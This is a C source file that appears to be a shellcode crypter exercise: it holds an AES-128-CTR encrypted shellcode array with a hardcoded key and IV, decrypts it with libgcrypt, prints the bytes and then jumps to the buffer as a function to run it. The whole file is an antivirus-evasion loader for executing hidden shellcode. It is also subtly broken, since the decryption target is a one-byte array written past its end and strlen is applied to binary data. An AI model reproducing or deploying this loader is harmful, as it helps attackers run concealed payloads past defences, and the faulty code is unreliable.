#include <stdio.h>
#include <string.h>
#include <gcrypt.h>
#include <stdint.h>

#define algo GCRY_CIPHER_AES128
#define mode GCRY_CIPHER_MODE_CTR
#define KEY_LENGTH 16
#define BLOCK_LENGTH 16

uint8_t encriptedShellcode[] = "\x8f\x06\x94\x69\xa4\xe9\xc4\x03\x4a\xdb\x3d\x28\x2d\x02\x77\xaa\x45\x41\x38\x94\x1d\x45\x83\xa1\xba\x16\x60\x3b\xb4\x19\x9f\xfb\x23\x39\x53\x87\xce\x69\x9c\x79\x2e\x12\xf2\xd4\x52\x9e\xfb\xe7\xbe\x5a\x03\x9e\x93";

uint8_t decriptedShellcode[] = "";

const char *key = "0123456789abcdef";
uint8_t IV[] = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\xf0\x10";
uint8_t ctr[] = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\xf0\x10";

static void decryption(int algo, size_t size, uint8_t *decriptedShellcode){

gcry_cipher_hd_t handle;
gcry_cipher_open(&handle, algo, mode, 0);
gcry_cipher_setkey(handle, key, KEY_LENGTH);
gcry_cipher_setiv(handle, IV, BLOCK_LENGTH);
gcry_cipher_setctr(handle, ctr, BLOCK_LENGTH);
gcry_cipher_decrypt(handle, decriptedShellcode, size, encriptedShellcode, size);
gcry_cipher_close(handle);

}

int main(void){

	int i=0;
	int size = strlen(encriptedShellcode);
	
	decryption(algo, size, decriptedShellcode);

	printf("\n");

	printf("Decrypted shellcode = ");
	while(i<size){
		printf("\\x%02x", decriptedShellcode[i]);
		i++;
        }

	printf("\n\n");

	int (*ret)() = (int(*)())decriptedShellcode;
	ret();

	printf("\n\n");

return 0;

}
